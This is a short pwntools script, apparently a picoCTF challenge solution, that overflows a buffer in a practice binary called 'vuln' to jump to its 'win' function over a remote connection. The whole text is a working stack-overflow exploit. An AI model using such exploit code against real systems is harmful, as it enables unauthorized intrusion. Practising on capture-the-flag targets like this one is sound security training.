from pwn import *

p = remote('saturn.picoctf.net', 54735)
e = ELF('./vuln')

p.sendline(b'A'*0x2c+p32(e.symbols['win']))
p.interactive()
